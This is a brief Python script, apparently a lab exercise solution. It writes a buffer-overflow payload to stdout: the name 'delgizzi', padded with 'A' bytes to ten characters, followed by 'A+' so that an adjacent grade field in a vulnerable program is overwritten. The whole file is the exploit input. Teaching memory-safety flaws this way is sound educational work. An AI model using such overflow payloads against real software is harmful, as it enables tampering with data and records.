from re import U
import sys
name = "delgizzi"
grade = "A+"
if __name__ == '__main__':
    first = bytes(name,"utf-8")
    first += b"A" * (10 - len(name))
    second = bytes(grade,"utf-8")
    attack = first + second
    sys.stdout.buffer.write(attack)
    